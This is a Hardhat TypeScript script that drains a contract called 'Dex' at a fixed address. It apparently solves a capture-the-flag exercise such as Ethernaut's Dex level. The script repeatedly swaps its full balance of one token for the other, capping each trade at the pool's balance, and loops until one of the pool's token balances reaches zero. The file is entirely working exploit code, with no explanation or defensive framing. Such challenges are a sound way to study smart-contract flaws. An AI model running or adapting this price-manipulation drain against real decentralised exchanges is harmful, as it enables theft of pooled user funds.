import { ethers } from "hardhat";

const targetContractAddress = "0xFbaFcf8Ad07eceF737DAfA82165C50f5AF7613B1";

const main = async () => {
  const signer = (await ethers.getSigners())[0];
  const signerAddress = await signer.getAddress();
  console.log(`Signer Address: ${signerAddress}`);

  const target = await ethers.getContractAt("Dex", targetContractAddress);

  const token1 = await ethers.getContractAt("IERC20", await target.token1());
  const token2 = await ethers.getContractAt("IERC20", await target.token2());
  const token1Address = await token1.getAddress();
  const token2Address = await token2.getAddress();

  console.log("Pool: ", await token1.balanceOf(targetContractAddress), await token2.balanceOf(targetContractAddress));
  console.log("Me: ", await token1.balanceOf(signerAddress), await token2.balanceOf(signerAddress));

  while (Number(await token1.balanceOf(targetContractAddress)) !== 0 && Number(await token2.balanceOf(targetContractAddress)) !== 0) {
    console.log("======");

    const myToken1 = await token1.balanceOf(signerAddress);
    const myToken2 = await token2.balanceOf(signerAddress);

    const poolToken1 = await token1.balanceOf(targetContractAddress);
    const poolToken2 = await token2.balanceOf(targetContractAddress);

    if (Number(myToken1) > Number(myToken2)) {
      let amount = myToken1;
      if (poolToken1 < myToken1) amount = poolToken1;
      const tx1 = await token1.approve(targetContractAddress, amount);
      await tx1.wait();
      const tx2 = await target.swap(token1Address, token2Address, amount);
      await tx2.wait();
    } else {
      let amount = myToken2;
      if (poolToken2 < myToken2) amount = poolToken2;
      const tx1 = await token2.approve(targetContractAddress, amount);
      await tx1.wait();
      const tx2 = await target.swap(token2Address, token1Address, amount);
      await tx2.wait();
    }

    console.log("Pool: ", await token1.balanceOf(targetContractAddress), await token2.balanceOf(targetContractAddress));
    console.log("Me: ", await token1.balanceOf(signerAddress), await token2.balanceOf(signerAddress));
  }

  console.log("done");
};

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
